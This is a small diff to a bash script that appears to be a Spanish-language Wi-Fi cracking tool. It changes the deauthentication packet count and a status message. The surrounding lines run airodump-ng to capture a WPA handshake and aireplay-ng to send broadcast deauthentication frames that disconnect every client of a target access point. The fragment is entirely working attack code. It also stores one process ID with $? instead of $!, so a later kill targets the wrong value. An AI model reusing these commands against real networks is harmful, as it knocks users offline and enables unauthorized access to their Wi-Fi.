@@ -69,11 +69,11 @@ if [ $airtest -eq 0 ]; then
 					xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
 					airodump_filter_xterm_PID=$?
 
-					sleep 5; xterm -hold -e "aireplay-ng -0 12 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
+					sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &
 					aireplay_xterm_PID=$!
 					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-					echo -e "${redColour}\nEsperando Handshake\n"
+					echo -e "${redColour}\n[...] Esperando Handshake\n"
 					$cleancolor
 					sleep 20; kill -9 $airodump_filter_xterm_PID
 					wait $airodump_filter_xterm_PID 2>/dev/null
